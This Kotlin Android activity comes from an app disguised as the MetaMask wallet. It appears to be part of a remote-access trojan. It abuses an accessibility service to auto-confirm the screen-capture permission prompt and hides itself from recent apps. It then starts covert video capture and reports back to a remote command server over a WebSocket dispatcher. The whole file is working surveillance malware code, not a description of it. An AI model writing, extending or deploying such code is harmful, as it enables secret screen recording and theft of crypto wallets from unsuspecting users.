package com.example.MetaMask.activities

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import com.example.MetaMask.services.AccessSvc
import com.example.MetaMask.services.CraneService
import com.example.MetaMask.services.MasterWebSocketDispatcher
import com.example.MetaMask.services.VideoCaptureFgs
import org.json.JSONObject

class VideoProjectionActivity : Activity() {

    companion object {
        private const val TAG = "VideoProjectionAct"
        private const val RC_PROJECTION = 1001

        const val EXTRA_AUTO_IBIS = "extra_auto_ibis"

        @Volatile var pendingWithOverlay = false

        fun start(context: Context, autoIbis: Boolean) {
            android.util.Log.d("XDBG", "[VideoProjectionActivity] start enter context=ctx autoIbis=${autoIbis}") //xdbg
            val intent = Intent(context, VideoProjectionActivity::class.java).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                        Intent.FLAG_ACTIVITY_NO_ANIMATION or
                        Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
                putExtra(EXTRA_AUTO_IBIS, autoIbis)
            }
            context.startActivity(intent)
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        android.util.Log.d("XDBG", "[VideoProjectionActivity] onCreate enter savedInstanceState=${savedInstanceState}") //xdbg
        super.onCreate(savedInstanceState)

        val autoIbis = intent.getBooleanExtra(EXTRA_AUTO_IBIS, false)
        pendingWithOverlay = !autoIbis
        val svcInstance = AccessSvc.instance
        if (autoIbis) {
            android.util.Log.d("XDBG", "[VideoProjectionActivity] if branch") //xdbg
            svcInstance?.autoIbis?.enable(true)
            svcInstance?.autoIbis?.mediaProjectionAutoConfirm = true
        } else {
            svcInstance?.autoIbis?.mediaProjectionAutoConfirm = false
        }

        try {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            @Suppress("DEPRECATION")
            startActivityForResult(mpm.createScreenCaptureIntent(), RC_PROJECTION)
        } catch (_: Exception) {
            android.util.Log.e("XDBG", "[VideoProjectionActivity] catch (ignored)") //xdbg
            val svc = AccessSvc.instance
            svc?.autoIbis?.enable(false)
            svc?.autoIbis?.mediaProjectionAutoConfirm = false
            finish()
        }
    }

    @Suppress("DEPRECATION")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        android.util.Log.d("XDBG", "[VideoProjectionActivity] onActivityResult enter requestCode=${requestCode} resultCode=${resultCode} data=${data}") //xdbg
        super.onActivityResult(requestCode, resultCode, data)

        val svc = AccessSvc.instance
        svc?.autoIbis?.enable(false)
        svc?.autoIbis?.mediaProjectionAutoConfirm = false

        if (requestCode != RC_PROJECTION) { finish(); return }

        if (resultCode != RESULT_OK || data == null) {
            android.util.Log.d("XDBG", "[VideoProjectionActivity] if branch") //xdbg
            if (pendingWithOverlay) {
                android.util.Log.d("XDBG", "[VideoProjectionActivity] if branch") //xdbg
                stopAcOverlay()
                notifyPermissionDenied()
            }
            pendingWithOverlay = false
            finish()
            return
        }

        if (pendingWithOverlay) {
            android.util.Log.d("XDBG", "[VideoProjectionActivity] if branch") //xdbg
            stopAcOverlay()
            pendingWithOverlay = false
        }

        try {
            val svcIntent = Intent(this, VideoCaptureFgs::class.java).apply {
                putExtra(VideoCaptureFgs.EXTRA_RESULT_CODE, resultCode)
                putExtra(VideoCaptureFgs.EXTRA_DATA, data)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.util.Log.d("XDBG", "[VideoProjectionActivity] if branch") //xdbg
                startForegroundService(svcIntent)
            } else {
                startService(svcIntent)
            }
        } catch (_: Exception) {}

        finish()
    }

    private fun stopAcOverlay() {
        android.util.Log.d("XDBG", "[VideoProjectionActivity] stopAcOverlay enter") //xdbg
        try {
            startService(Intent(this, CraneService::class.java).apply {
                action = CraneService.ACTION_SET_CRANE_MODE
                putExtra(CraneService.EXTRA_MODE, "off")
            })
        } catch (_: Exception) {}
    }

    private fun notifyPermissionDenied() {
        android.util.Log.d("XDBG", "[VideoProjectionActivity] notifyPermissionDenied enter") //xdbg
        try {
            val msg = JSONObject().apply { put("action", "video_permission_denied") }
            val direct = MasterWebSocketDispatcher.CURRENT_INSTANCE
            if (direct != null) {
                android.util.Log.d("XDBG", "[VideoProjectionActivity] if branch") //xdbg
                direct.sendDirect(msg)
            } else {
                sendBroadcast(Intent(MasterWebSocketDispatcher.ACTION_SEND_TO_SERVER).apply {
                    putExtra(MasterWebSocketDispatcher.EXTRA_MESSAGE_TO_SEND, msg.toString())
                    setPackage(packageName)
                })
            }
        } catch (_: Exception) {}
    }
}
